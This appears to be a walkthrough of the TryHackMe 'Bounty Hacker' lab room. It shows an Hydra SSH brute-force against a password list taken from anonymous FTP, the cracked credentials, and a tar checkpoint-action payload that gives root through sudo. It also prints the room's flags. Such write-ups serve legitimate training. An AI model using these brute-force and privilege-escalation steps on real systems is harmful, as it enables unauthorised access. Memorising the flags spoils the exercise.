# Bounty Hacker — TryHackMe

**Date:** June 2026  
**Difficulty:** Easy  
**Category:** FTP, SSH, Privilege Escalation  
**Status:** ✅ Completed  

---

# 🔍 Summary

Bounty Hacker is an easy TryHackMe room focused on service enumeration, credential discovery, brute forcing, and Linux privilege escalation. The objective was to enumerate exposed services, gather intelligence through anonymous FTP access, obtain valid SSH credentials, and escalate privileges to root.

---

# 🛠️ Tools Used

- Nmap
- FTP
- Hydra
- SSH
- GTFOBins

---

# 📡 Reconnaissance

## Nmap Scan

```bash
nmap -sS -A -T4 MACHINE_IP
```

<img width="2339" height="832" alt="Screenshot 2026-06-02 202203" src="https://github.com/user-attachments/assets/52182f0d-8542-4178-bedf-350f5933ab6f" />


### Findings

| Port | Service |
|--------|---------|
| 21 | FTP |
| 22 | SSH |
| 80 | HTTP |

Important findings:

- Anonymous FTP login enabled
- SSH service available
- Web application accessible

---

## FTP Enumeration

Connecting to the FTP service:

```bash
ftp MACHINE_IP
```

Anonymous login was permitted.

<img width="2249" height="525" alt="Screenshot 2026-06-02 202531" src="https://github.com/user-attachments/assets/db227b87-b080-4667-b7bb-57db3287955b" />


Inside the FTP share, two files were discovered:

```text
task.txt
locks.txt
```

Both files were downloaded for analysis.

---

## Reviewing FTP Files

### task.txt

```text
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

### locks.txt

The file contained a large list of possible passwords.

<img width="856" height="646" alt="Screenshot 2026-06-02 202550" src="https://github.com/user-attachments/assets/09a111a9-7231-4a59-b7a6-d1301216192f" />


This appeared to be a custom wordlist likely intended for brute force attacks.

---

## Website Enumeration

Browsing the website revealed a Cowboy Bebop themed webpage.

<img width="2368" height="1315" alt="Screenshot 2026-06-02 203004" src="https://github.com/user-attachments/assets/599c7a0b-0a88-4e8a-b684-cf50fd00878b" />



# 🔓 Exploitation

## SSH Brute Force

Using the password list from `locks.txt`:

```bash
hydra -l lin -P locks.txt ssh://MACHINE_IP
```

<img width="1679" height="315" alt="Screenshot 2026-06-02 203611" src="https://github.com/user-attachments/assets/a18536ea-9374-4ead-bf8e-b89ad857fd3e" />


### Credentials Found

```text
Username: lin
Password: RedDr4g0nSynd1cat3
```

---

## SSH Access

Using the discovered credentials:

```bash
ssh lin@MACHINE_IP
```

Successfully logged into the target machine.

<img width="978" height="829" alt="Screenshot 2026-06-02 203939" src="https://github.com/user-attachments/assets/11483af8-dd8d-4988-8ed5-d5218454f9d3" />


---

# 🚩 User Flag

Inside the user's home directory:

```bash
cat user.txt
```

Output:

```text
THM{CR1M3_SyNd1C4T3}
```

---

# ⬆️ Privilege Escalation

## Sudo Enumeration

Checking sudo permissions:

```bash
sudo -l
```

Output:

```text
(root) /bin/tar
```

The user was allowed to execute `tar` as root.

---

## GTFOBins Research

Searching GTFOBins revealed a privilege escalation technique using tar.

<img width="1789" height="1317" alt="Screenshot 2026-06-02 203956" src="https://github.com/user-attachments/assets/15424eb0-64fc-41fb-8d32-a2bc2449762e" />


Payload:

```bash
sudo tar cf /dev/null /dev/null \
--checkpoint=1 \
--checkpoint-action=exec=/bin/sh
```

---

## Root Shell

Executing the payload spawned a root shell.

```bash
whoami
```

Output:

```text
root
```

<img width="978" height="829" alt="Screenshot 2026-06-02 203939" src="https://github.com/user-attachments/assets/770c4394-c710-4853-bc66-5618239479cb" />


---

# 🚩 Root Flag

Reading the root flag:

```bash
cd /root
cat root.txt
```

Output:

```text
THM{80UN7Y_h4cK3r}
```

---
<img width="1815" height="1046" alt="Screenshot 2026-06-02 204008" src="https://github.com/user-attachments/assets/d69689c9-dd5d-42e6-9bda-f51b4181365a" />

# 📚 Lessons Learned

- Practiced service enumeration with Nmap
- Enumerated anonymous FTP shares
- Extracted useful intelligence from exposed files
- Built targeted username and password lists
- Used Hydra for SSH brute forcing
- Practiced Linux user enumeration
- Learned privilege escalation using tar
- Used GTFOBins for privilege escalation research

---
